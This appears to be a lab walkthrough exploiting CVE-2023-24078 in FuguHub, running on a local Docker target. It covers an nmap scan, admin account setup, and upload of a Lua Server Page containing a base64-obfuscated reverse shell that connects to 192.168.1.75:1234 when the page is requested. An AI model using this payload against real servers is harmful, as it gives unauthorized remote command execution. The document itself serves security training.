_____
# Enumeration

## Nmap

Initial step. Starting with an Nmap scan. We have 2 open ports "**8082**" and "**9999**".

```
nmap -Pn --open 172.17.7.2
```

![](https://portal.offsec.com/labs/images/nmap.png)

Open the address. (Docker bind address to localhost)

```bash
http://127.0.0.1:8082
```

![](https://portal.offsec.com/labs/images/land.png)

# FuguHub

[FuguHub](https://fuguhub.com//)

> transforms your computer (or device) into a powerful and secure online storage system, letting you access and share files from any connected computer or device in the world.

---

# Exploitation

## Remote Code Execution

We find "**[CVE-2023-24078](https://www.cvedetails.com/cve/CVE-2023-24078/ "CVE-2023-24078 security vulnerability details")**" recorded for ****Real Time Logic FuguHub**.

![](https://portal.offsec.com/labs/images/cve.png)

---

## POC

The actual poc can be found here ->[Fuguhub-8.1-RCE/Fuguhub-8-1-RCE-Report.pdf at main · ojan2021/Fuguhub-8.1-RCE · GitHub](https://github.com/ojan2021/Fuguhub-8.1-RCE/blob/main/Fuguhub-8-1-RCE-Report.pdf)

Steps:

1. Go to the link: http://127.0.0.1:8082/Config-Wizard/wizard/SetAdmin.lsp
    
2. For the poc I am using "test@test.com" for all the fields.
    
    Uncheck "**Enable password recovery (by E-mail):**"
    
    
3. Now go the link: http://127.0.0.1:8082/rtl/protected/wfslinks.lsp or click on "**Web-File-Server**" nav menu.
    
4. Once will fill the creds, we will get logged in.
    
5. Click on "**fs**" or go the link: http://127.0.0.1:8082/fs/
    
6. Create a file named as **"rev.lsp"** and put the below content into the file
    
    ```lisp
    <div style="margin-left:auto;margin-right: auto;width: 350px;">
    
    <div id="info">
    <h2>Lua Server Pages Reverse Shell</h2>
    <p>Delightful, isn't it?</p>
    </div>
    
    <?lsp if request:method() == "GET" then ?>
       <?lsp os.execute("echo c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjc1LzEyMzQgMD4mMQo= | base64 -d | bash") ?>
    <?lsp else ?>
       You sent a <?lsp=request:method()?> request
    <?lsp end ?>
    
    </div>
    ```
    
7. Listen netcat on your local machine
    
8. Now upload that **rev.lsp** file
    
9. Now go back, you will find the file listed there.
    
    Verify that `rev.lsp` is listed in the file browser (the original screenshot is unavailable).

10. Finally go the link: http://127.0.0.1:8082/rev.lsp
    
11. The payload will get executed.
